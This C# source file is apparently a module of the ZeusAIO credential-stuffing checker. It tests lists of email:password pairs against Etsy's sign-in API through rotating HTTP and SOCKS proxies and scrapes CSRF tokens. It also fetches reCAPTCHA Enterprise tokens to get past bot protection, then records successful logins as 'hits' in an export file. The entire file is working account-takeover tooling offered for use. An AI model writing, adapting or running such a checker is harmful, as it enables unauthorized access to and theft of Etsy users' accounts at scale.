using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Etsy
{
    class Check
{
    public static bool CheckAccount(string[] s, string proxy)
    {
        for (int i = 0; i < Config.config.Retries + 1; i++)
            while (true)
                try
                {
                Retry:
                    using (HttpRequest req = new HttpRequest())
                    {
                        proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            req.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            req.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            req.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) WavesCentral/11.0.58 Chrome/76.0.3809.146 Electron/6.1.8 Safari/537.36";
                        req.IgnoreProtocolErrors = true;
                        req.AllowAutoRedirect = false;
                        req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");

                        var res0 = req.Get("https://www.etsy.com/");
                        string text0 = res0.ToString();

                        var GUID = Functions.LR(text0, "\"page_guid\":\"", "\"").FirstOrDefault();
                        var TOKEN = Functions.LR(text0, "csrf_nonce\":\"", "\",\"").FirstOrDefault();
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Accept-Language", "en-US,en;q=0.5");
                        req.AddHeader("Accept-Encoding", "gzip, deflate");
                        req.AddHeader("x-csrf-token", "" + TOKEN + "");
                        req.AddHeader("x-detected-locale", "USD|en-US|EG");
                        req.AddHeader("X-Page-GUID", "" + GUID + "");
                        req.AddHeader("X-Requested-With", "XMLHttpRequest");
                        req.AddHeader("Origin", "https://www.etsy.com");
                        req.AddHeader("DNT", "1");
                        req.AddHeader("Connection", "close");
                        req.AddHeader("Referer", "https://www.etsy.com/");

                        var res1 = req.Post("https://www.etsy.com/api/v3/ajax/bespoke/member/neu/specs/Join_Neu_Controller", "stats_sample_rate=&specs%5BJoin_Neu_Controller%5D%5B%5D=Join_Neu_ApiSpec_Page&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bform_action%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bwith_action_context%5D=true&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bpersistent%5D=true&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Binitial_state%5D=sign-in&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_page%5D=https%3A%2F%2Fwww.etsy.com%2F&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bview_type%5D=overlay&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_action%5D=signin-header", "application/x-www-form-urlencoded");
                        string text1 = res1.ToString();

                        var TOKEN2 = Functions.LR(text1, " type=\\\"hidden\\\" name=\\\"_nnc\\\" value=\\\"", "\\\"").FirstOrDefault();
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");

                        var res2 = req.Get("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6Ldgkr0ZAAAAAGnf08YhMemepXW29Ux9rtJCcBD3&co=aHR0cHM6Ly93d3cuZXRzeS5jb206NDQz&hl=en&v=1AZgzF1o3OlP73CVr69UmL65&size=invisible&cb=uouh7w7vla4x");
                        string text2 = res2.ToString();

                        var TOKEN3 = Functions.LR(text2, "\"recaptcha-token\" value=\"", "\"").FirstOrDefault();
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");

                        var res3 = req.Post("https://www.google.com/recaptcha/enterprise/reload?k=6Ldgkr0ZAAAAAGnf08YhMemepXW29Ux9rtJCcBD3", "v=1AZgzF1o3OlP73CVr69UmL65&reason=q&c=" + TOKEN3 + "&k=6Ldgkr0ZAAAAAGnf08YhMemepXW29Ux9rtJCcBD3&co=aHR0cHM6Ly93d3cuZXRzeS5jb206NDQz.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!5-Gg4cjIAAWoGLRLqEfe9gctNGUprl0ekMBdprmTgwcAAAMwVwAAACicCZNECGVv__iUbq6h5XzlPTaVb96i4cvAYNWFakaunwXAJHswEGMyIlNPmyHC7hVwenrn4C4dOTHvAn9wjK_-VRL6G64nWNVewrbOL46VJj5iGIKcjXZ78O8dzwifamh2cADNSgephbSja5_wB3_I4GYaYDhrbxsuNJqL2v3i0o0uNCL9PKQJQzKInTWqgiXkudYif-T4GZCQkKyV_IacUqPYPeMbSrl0loSKMdqbf-s8bNW5uIZM74JYQvHPJ03s8qKj3gI358La2Bt7j1OUbAXI1U1bIk94y1-atqdlnQLAEOxjSYzf2lN1RqnhtVRMw2QfMUECf2K2WeqhUt9P2Nkc8FPmdQmuOj_lc6O1g9bAGtiI_lPRkQ5fYV4HJnFCzAb8a1WHiAFzVpU5Hso-Y3zcwU9sCr1Ul4H2PVTRyIHG6d3zTwDX1E5MD6QylR3TfQYshP2Ve8GsGM4y1qZ_u2uIzj-9wYfvp-DAhQVAQ-J50EdGJDG4HdnAs_fEXPA3D4Vwm3YOg0hG4QyEtGA4Bu7k6yW8Vt-XtzHCuW9apRoPk1RppTpu2DmU4YyMhO-0GiOew4iisknuiAADxbLxX2HI36pfCT0lJh24shfcF-nsjmnVdt535bf2Xm7nJOWNwJ8yIR-xdR9pC8yjkvUwGq0VL6QlhT7LapuGh2J1VwKP9_F9wD3k9oJdM5Lugik6ZcsnTKy1q4UG8GA-JnOt4q6iNwA7BqrLgM-NM3lSCZv1sMwEVMRiJxSkX1P8abKDylDsQsmQq3l4mvcJTFlCROm7gS94-c1AZlam4rE2iv4nLDiVUVtEb_Dfv89s3vLqVryPOVHtlVOVi5F_k2esAs8lrCMkepiGFoED_caknkgDpluCMwGo8I3LLzOVff3mkQU_CTxmB2ygqcbuEZGuBnGZ-0t1J6ctB3ynq-j6DnIEHX9sAvVZYruVeC0lk93RxnUdwypX4TU7p-xVOhcw1wGCpfUemWYsda91ZsTAqsw_Dgz3gmGAKgFi4y9C3BvC9Yi6ZhZJv7p-ihjmZZmpLdwXYCNY5KLAD_onTRpKmmw-GTfyE-_u_w4TTKjPA2TJLYQ7dw4SiO5s-HnVYUO82Cm5rVLVm1AReLcHMWVgvXwP0YksiqmZR0T-JIsLMZK9owhCSBT76H85RfvPJYpuldEGi7-LsGKKqFCf-WwnOjC0RoIMbccMW5JwSv-IqPhdjN1c3DhaGFtrujKR9xZrSwI0kyoup2EZY_ex99uxe8Tyz5FXIjmisMJ3ITaWB9RBmqJ250qSpCaN0L_lDP1kHJkYb4lO6FM4A3PAZbICFw5NM1kDGryoP8TbLV9n8NMLIH0v8tuyeyvFwVRxcPH2QrkFhmtXlf5BMRpWrjUqYPok-ep2mQaBpXyCYSgtgkxz12vDW8ZrquLQqfui-A1kXMPA3_3wQFzx-DkDpt-BNe5SWdV4XQgrK-ojWDqi8seeYkJnLE0k_4CVxebdkdWT43anR5jQ2NcTmKVea8KvQELZJvDJqlY0AlKHAd7NvPLRv_s40dFn1mz_CFhYDDuAIPIwegva12MFZNV8C8vP8nORErtyuWVQf6dfeqYVTty1WMoNSoi0snBOqwwm97YDYwjZ4yetWARZ5w-XAW9Eb5QftMQrA-jp9qTX7giUIuBxoWJ4qnmhr5OIHYclT8gGYpXoH_2KjKX7HK_7Siv_phbDeyGJWHMZwaLsRT2eMqjRGln03SiSFWJMEAyUw_NbFvzdWhgNewU7ItQLLF97Cm4UFqxZoypeE3Sfm-88MbOROL6hILaA8OAjHMzpxc9nRRIt9bB8h5QNyVfsAk6LU7fsg4Xy7xBu9ru9oVgCREqqIsOPYfZzaTmSB-6x-SBs1FYdCW9H0Ej7QLoHGeEmZLBhzPC0bXyYlvctkWNyXU_bRmoaYp38SkH6AgI0NY2CABxelbH6zzp_658hHHgyOLX_e5QohU9rJFLn-05PwZTRJ4e2o2FcUUJvRR-o5fTbkJ9rP6qbHCwjwkbgCCzYxUQUwjx-XBpm4GRKPg3xSj0Tr54CZdHMK01c3CGcwfnvHd9wT6xqOlJ3hfpK0CpYFFj5yXKVwb20dxTYS8kyhyqf7_XwJjimGEbMKXvazigQpCszbLi51OTiizWOZIooAnODtZYFC3IZJQedOqmLrehQaCWLUA8L8jN-eXb6BESjVsLRZAQOQ7SjVuJqvdNXozwbgdrvAhx0kO5L9yc2cB2UHiqRhgD8kdFnnb97xMay1AaLzq_QFe-TSeAyK7HJ0gKYWhqeeeW179ahnusI7d1kzdaoSLCvPl3leOPOPH_m331Ow8BUWR2dPEHssGMOMLn7Nbr6-QbkdItg7xIt8bHwc1OzszgXDGLPQaEVcGkDTQgUUzPOreFrae84nJA-ZgyHUoPYBV4vlu-sk5Xj1reFvhZNpP3FPeIFmXTgXXxHnn8nMziXpJ-AgR7YZIT64rvEIuOz0HVr7_blLzCbsCcsoO9irPEPbwaLuRj8b-VIUkgNmfVVSZXXojJ3GiXPRyIYsbuf8WWFxRSFZlIMDbGcfSrRgCwyuFFxz8hqiGnCMgt_eiD6taw-Fg2_qTJLVspaVWoSyn7QVp9qO0GOTXB2gZsrGSEknDbS0SNQ5Yqb-zEFufaYHHFCkbBjjA0MDQI3UlNoHPymfSLHDh_w18NajE8SHONMuLWZI-z1CmOlg_8nJDDIVXUK34cT1qHbG2jsOEX6IjK0WqoPOh76tDq8-MO4mXimjZ1uM-cmFII7ftd9fMUVkafNqCguYC-YWdUpN8kleNvtDY_j3m5ENltyiQW91eIb2xxrGHQh25sWWp6Br68G38ZW6ytYGaj84w_exIIUZ-elRztaY6aEzoj5oZxurXnvhLWdCTFLdgHPXRYAR5-FitHRdgf7ZxSOK7QcrC7oMonBueINVdQKFE1VFpyi-5JcV6Bky3Ji8dbbcA6MIm5FDFF6Rtc23TLTn6VEfhTDMyaD49u5DGvJn65MRh0ClOLspJpWN63p6Pig3gzt1XmX4GKlmnKWiMt3dZrQ7pAXGAkL8cE41kdBX-NxJV1bMfhSj2xQCDHNFqOGSfn7vixW9BWKwIP-kxQ2vgURiFCQoRf3fqjTYq_SBSUXVeLuXxWw9IdXiy5R30BoAgWfEGG_dZCk8SBAD5Uo0MfgfJ43EjFaBZlBIVACsFvAA_pPRoHJrJPD5jbTI0bpMgyIOVxKVoNkAvVxtj3a-1izrBT_D7Q_cpXqXz-BcjNInG7sA-k", "application/x-www-form-urlencoded");
                        string text3 = res3.ToString();

                        var REC = Functions.LR(text3, "[\"rresp\",\"", "\",").FirstOrDefault();
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Accept-Language", "en-US,en;q=0.5");
                        req.AddHeader("Accept-Encoding", "gzip, deflate");
                        req.AddHeader("x-csrf-token", "" + TOKEN + "");
                        req.AddHeader("x-detected-locale", "USD|en-US|EG");
                        req.AddHeader("X-Page-GUID", "" + GUID + "");
                        req.AddHeader("X-Requested-With", "XMLHttpRequest");
                        req.AddHeader("Origin", "https://www.etsy.com");
                        req.AddHeader("DNT", "1");
                        req.AddHeader("Connection", "close");
                        req.AddHeader("Referer", "https://www.etsy.com/");

                        var res4 = req.Post("https://www.etsy.com/api/v3/ajax/bespoke/member/neu/specs/Join_Neu_Controller", "stats_sample_rate=&specs%5BJoin_Neu_Controller%5D%5B%5D=Join_Neu_ApiSpec_Page&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bform_action%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bsubmit_attempt%5D=sign-in&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bwith_action_context%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bview_type%5D=overlay&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bshould_use_new_password_skin%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_page%5D=https%3A%2F%2Fwww.etsy.com%2F&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_action%5D=signin-header&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_identifier%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_type%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Binitial_state%5D=sign-in&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5B_nnc%5D=" + TOKEN2 + "&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bemail%5D=" + s[0] + "&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfirst_name%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bpassword%5D=" + s[1] + "&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Benterprise_recaptcha_token%5D=" + REC + "&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Benterprise_recaptcha_token_key_type%5D=score&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_code%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_access_token%5D=", "application/x-www-form-urlencoded");
                        string text4 = res4.ToString();

                        if (text4.Contains("render_aborted\":true"))
                        {
                            ZeusAIO.mainmenu.hits++;
                            if (Config.config.LogorCui == "2")
                            {
                                Console.WriteLine("[HIT - ETSY] " + s[0] + ":" + s[1], Color.Green);
                            }
                            Export.AsResult("/Etsy_hits", s[0] + ":" + s[1]);
                            return false;
                        }
                        else if (text4.Contains("Email address is invalid.") || text4.Contains("Password was incorrect."))
                        {
                            break;
                        }
                        else if (text4.Contains("Connection error during authentication"))
                        {
                            ZeusAIO.mainmenu.realretries++;
                            goto Retry;
                        }
                        else
                        {
                            ZeusAIO.mainmenu.realretries++;
                            goto Retry;
                        }
                    }
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}
